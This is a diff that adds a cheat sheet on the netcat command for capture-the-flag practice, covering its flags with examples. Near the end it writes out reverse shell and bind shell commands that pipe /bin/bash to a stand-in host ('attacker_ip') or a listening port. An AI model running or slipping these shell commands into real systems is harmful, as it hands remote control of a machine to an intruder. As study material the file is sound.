@@ -1,0 +1,55 @@
+Command: nc (Netcat)
+
+Description:
+Netcat is a powerful networking utility used to read and write data across network connections using TCP or UDP.
+It is commonly used in CTFs for port scanning, banner grabbing, file transfer, and reverse/bind shells.
+
+Basic Syntax:
+nc [options] target port
+
+Commonly Used Flags:
+
+-l
+Listen mode. Makes netcat listen for incoming connections instead of initiating one.
+Example:
+nc -l 4444
+
+-v
+Verbose mode. Shows detailed connection information.
+Example:
+nc -v example.com 80
+
+-n
+Do not perform DNS resolution. Uses raw IP addresses.
+Useful for speed and stealth.
+Example:
+nc -n 192.168.1.10 80
+
+-p
+Specify source port.
+Example:
+nc -p 1234 example.com 80
+
+-u
+Use UDP instead of TCP.
+Example:
+nc -u example.com 53
+
+-e
+Execute a program after connection is established (often disabled in modern versions).
+Used in reverse shells.
+Example:
+nc -e /bin/bash attacker_ip 4444
+
+Reverse Shell Example:
+nc attacker_ip 4444 -e /bin/bash
+
+Bind Shell Example:
+nc -l 4444 -e /bin/bash
+
+CTF Use Cases:
+- Reverse shells
+- File transfer
+- Port listening
+- Banner grabbing
+- Exploiting misconfigured services
